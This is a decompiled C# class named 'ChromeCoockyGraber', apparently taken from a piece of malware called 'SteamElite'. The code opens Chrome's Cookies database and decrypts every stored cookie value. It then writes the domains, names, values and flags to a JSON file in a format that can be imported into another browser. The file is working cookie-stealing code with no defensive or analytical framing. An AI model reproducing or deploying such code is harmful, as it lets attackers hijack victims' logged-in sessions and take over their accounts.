// Decompiled with JetBrains decompiler
// Type: ChromeCoockyGraber
// Assembly: SteamElite, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC0AF3C1-BDDB-427F-AF9C-215450AD8173
// Assembly location: C:\Users\Пользователь\Desktop\Decompiled.exe

using System;
using System.Collections.Generic;
using System.Data;
using System.Data.Common;
using System.Data.SQLite;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Web.Script.Serialization;

internal class ChromeCoockyGraber
{
  private List<ChromeCoockyGraber.Data> CoockyMas = new List<ChromeCoockyGraber.Data>();

  private string[] pars(string page, string regul)
  {
    MatchCollection matchCollection = new Regex(regul).Matches(page);
    string[] strArray = new string[matchCollection.Count];
    for (int index = 0; index < matchCollection.Count; ++index)
      strArray[index] = matchCollection[index].Groups[1].ToString();
    return strArray;
  }

  public void GetCoocky(string db_way = "Cookies", string _path = "cook.json")
  {
    byte[] entropyBytes = (byte[]) null;
    string str1 = "Cookies";
    string str2 = "data source=" + db_way + ";New=True;UseUTF16Encoding=True";
    DataTable dataTable = new DataTable();
    using (SQLiteConnection sqLiteConnection = new SQLiteConnection(str2))
    {
      ((DbDataAdapter) new SQLiteDataAdapter(new SQLiteCommand(string.Format("SELECT * FROM {0} {1} {2}", (object) str1, (object) "", (object) ""), sqLiteConnection))).Fill(dataTable);
      int count = dataTable.Rows.Count;
      for (int index = 0; index < count; ++index)
      {
        string description;
        string str3 = new UTF8Encoding(true).GetString(SQB.Decrypt((byte[]) dataTable.Rows[index][12], entropyBytes, out description));
        try
        {
          ChromeCoockyGraber.Data data = new ChromeCoockyGraber.Data();
          DataRow row = dataTable.Rows[index];
          data.domain = dataTable.Rows[index][1].ToString();
          data.expirationDate = Convert.ToDouble(dataTable.Rows[index][5]);
          data.secure = Convert.ToBoolean(Convert.ToInt32(dataTable.Rows[index][6]));
          data.httpOnly = Convert.ToBoolean(Convert.ToInt32(dataTable.Rows[index][7]));
          data.hostOnly = false;
          data.session = false;
          data.storeId = "0";
          data.name = dataTable.Rows[index][2].ToString();
          data.value = str3;
          data.path = dataTable.Rows[index][4].ToString();
          data.id = this.CoockyMas.Count;
          this.CoockyMas.Add(data);
        }
        catch
        {
        }
      }
    }
    this.CoockyToFile(_path);
  }

  private void CoockyToFile(string _path)
  {
    string contents = new JavaScriptSerializer().Serialize((object) this.CoockyMas);
    File.WriteAllText(_path, contents);
  }

  public class Data
  {
    public string domain { get; set; }

    public double expirationDate { get; set; }

    public bool hostOnly { get; set; }

    public bool httpOnly { get; set; }

    public string name { get; set; }

    public string path { get; set; }

    public bool secure { get; set; }

    public bool session { get; set; }

    public string storeId { get; set; }

    public string value { get; set; }

    public int id { get; set; }
  }
}
